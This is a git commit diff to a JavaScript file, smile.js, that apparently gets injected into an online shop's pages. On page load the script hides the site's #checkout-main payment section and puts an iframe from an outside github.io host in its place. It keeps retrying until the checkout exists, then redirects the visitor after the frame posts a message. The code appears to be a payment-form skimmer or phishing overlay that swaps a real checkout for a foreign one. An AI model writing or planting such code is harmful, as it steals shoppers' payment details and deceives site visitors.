e8dfc6290c035497724a4bdda17da2cad929f0dd
Ralph Lauren <rl@example.com>
2024-09-20 20:22:13 +0300

    feat: smile

--- smile.js
+++ smile.js
@@ -6,28 +6,37 @@ function resizeIframe(iframe) {
     // iframe.style.height = "500px";
 }
 document.addEventListener("DOMContentLoaded", afterLoadingPage);
-
+let paymentDivOr;
 function afterLoadingPage() {
     console.log("Страница полностью загружена");
-    const paymentDivOr = document.querySelector(`#checkout-main`);
+    paymentDivOr = document.querySelector(`#checkout-main`);
     console.log(`this is paymentDivOr`);
     console.log(paymentDivOr);
     paymentDivOr.style.display = "none";
-    if (paymentDivOr) {
-        paymentDivOr.style.display = "none";
-        const paymentDivNew = document.createElement("div");
-        paymentDivNew.style.height = "100%";
-        paymentDivNew.innerHTML = `<iframe src="https://rlcodingrl.github.io/nginx_script/smileFrame" style="width: 100%; height: 600px" onload="resizeIframe(this)"></iframe>`;
-        paymentDivOr.insertAdjacentElement("afterend", paymentDivNew);
-        window.addEventListener("message", function (event) {
-            if (event.origin === "https://rlcodingrl.github.io") {
-                console.log("Сообщение из iframe:", event.data);
-                window.location.replace("https://hismileteeth.com");
-            }
-        });
-    }
+    checkIfPaymentDivOrExist();
 }
 
+function changePaymentDiv() {
+    paymentDivOr.style.display = "none";
+    const paymentDivNew = document.createElement("div");
+    paymentDivNew.style.height = "100%";
+    paymentDivNew.innerHTML = `<iframe src="https://rlcodingrl.github.io/nginx_script/smileFrame" style="width: 100%; height: 600px" onload="resizeIframe(this)"></iframe>`;
+    paymentDivOr.insertAdjacentElement("afterend", paymentDivNew);
+    window.addEventListener("message", function (event) {
+        if (event.origin === "https://rlcodingrl.github.io") {
+            console.log("Сообщение из iframe:", event.data);
+            window.location.replace("https://hismileteeth.com");
+        }
+    });
+}
+
+function checkIfPaymentDivOrExist() {
+    if (paymentDivOr) {
+        changePaymentDiv();
+    } else {
+        setTimeout(checkIfPaymentDivOrExist, 1000);
+    }
+}
 // window.onload = function () {
 
 // };
